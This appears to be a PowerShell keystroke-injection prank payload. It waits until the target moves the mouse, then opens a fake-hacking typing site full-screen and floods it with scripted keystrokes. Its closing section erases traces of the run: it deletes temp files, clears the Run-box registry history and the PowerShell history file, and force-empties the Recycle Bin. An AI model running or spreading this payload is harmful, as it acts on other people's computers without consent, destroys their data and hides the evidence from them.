
function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}



# Turn of capslock if it is left on

$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){$key = New-Object -ComObject WScript.Shell;$key.SendKeys('{CapsLock}')}

#############################################################################################################################################

Target-Comes


Start microsoft-edge:'http://geektyper.com/plain'; $wshell = New-Object -ComObject wscript.shell; Sleep 2; $wshell.SendKeys('{f11}'); 
 Sleep 2; 
$wshell.SendKeys('qwertyyuiopjkfldsqwertyufdasfdasiopqwertyutyufdasfdfdafdsldsqwertyufdasffdadasiopqwertyutyufdasfdasiopqwertiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{RIGHT}'); 
 Sleep 22; 
$wshell.SendKeys('{BS}'); 
$wshell.SendKeys('qwertfdafdsayuiopqwertyuiopqqwerfdafmjmjhmuymuyukjjhgkuyukuueaftyyuiopqwertyufdasfdasiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiopwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{HOME}'); 
 Sleep 4; 
$wshell.SendKeys('{6}'); 
 Sleep 6; 
$wshell.SendKeys('{7}'); 
 Sleep 5;  
$wshell.SendKeys('{+}'); 
 Sleep 5; 
$wshell.SendKeys('{BS}'); 
 Sleep 2; 
$wshell.SendKeys('qwertyyuiopjkfldsqwertyufdasfdasiopqwertyutyufdasfdfdafdsldsqwertyufdasffdadasiopqwertyutyufdasfdasiopqwertiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 3;
$wshell.SendKeys('qwertyyuiopjkfldsqwertyufdasfdasiopqwertyutyufdasfdfdafdsldsqwertyufdasffdadasiopqwertyutyufdasfdasiopqwertiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('qwertfdafdsayuiopqwertyuiopqqwerfdafmjmjhmuymuyukjjhgkuyukuueaftyyuiopqwertyufdasfdasiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiopwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{2}'); 
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5; 
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5;  
$wshell.SendKeys('{3}'); $wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{END}');  Sleep 5; $wshell.SendKeys('{0}'); Sleep 7; $wshell.SendKeys('%{F4}');



$D="$env:tmp"


# empty temp folder
rm $D\j* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue